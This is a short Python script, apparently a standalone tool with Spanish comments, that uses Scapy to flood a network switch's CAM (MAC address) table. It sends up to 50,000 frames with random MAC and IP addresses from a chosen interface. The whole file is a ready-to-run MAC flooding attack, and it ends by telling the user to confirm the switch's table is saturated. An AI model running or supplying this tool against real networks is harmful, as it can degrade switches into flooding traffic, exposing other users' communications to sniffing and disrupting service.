import os
import sys
from scapy.all import sendp, Ether, IP, ICMP, RandMAC, RandIP

def ejecutar_desbordamiento_cam(target_interface, max_burst=50000):
    """
    Satura la tabla de direcciones MAC (CAM) enviando ráfagas directas
    de tráfico aleatorio sin precargar listas masivas en la memoria RAM.
    """
    # Verificación de privilegios de root nativa de Linux
    if os.geteuid() != 0:
        sys.stderr.write("[-] Error crítico: Se requieren privilegios de Administrador (sudo).\n")
        sys.exit(1)

    sys.stdout.write(f"[*] Escaneando medio físico... Interfaz activa: {target_interface}\n")
    sys.stdout.write(f"[*] Iniciando inundación asíncrona de tramas Ethernet (Límite: {max_burst})...\n")

    contador = 0

    try:
        # Generador directo que evita el consumo excesivo de memoria del script anterior
        while contador < max_burst:
            # Construcción dinámica e inyección directa en grupos pequeños para rendimiento óptimo
            trama_basura = (
                Ether(src=RandMAC(), dst=RandMAC()) / 
                IP(src=RandIP(), dst=RandIP()) / 
                ICMP()
            )

            # sendp inyecta directo en Capa 2; verbose=False elimina salidas innecesarias
            sendp(trama_basura, iface=target_interface, verbose=False)
            contador += 1

            # Indicador de progreso visual minimalista en la misma línea
            if contador % 1000 == 0:
                sys.stdout.write(f"\r[>] Tramas inyectadas en el plano de datos: {contador}/{max_burst}")
                sys.stdout.flush()

        sys.stdout.write("\n[+] Proceso finalizado. Tabla CAM saturada.\n")
        sys.stdout.write("[i] Verifique el estado del switch con: 'show mac address-table'\n")

    except KeyboardInterrupt:
        sys.stdout.write("\n[-] Inundación abortada por el usuario.\n")
    except Exception as error_red:
        sys.stderr.write(f"\n[-] Fallo en la interfaz de red: {error_red}\n")

if __name__ == "__main__":
    # Configuración de variables locales independientes
    NIC_OBJETIVO = "eth0"
    TOTAL_TRAMAS = 50000

    ejecutar_desbordamiento_cam(target_interface=NIC_OBJETIVO, max_burst=TOTAL_TRAMAS)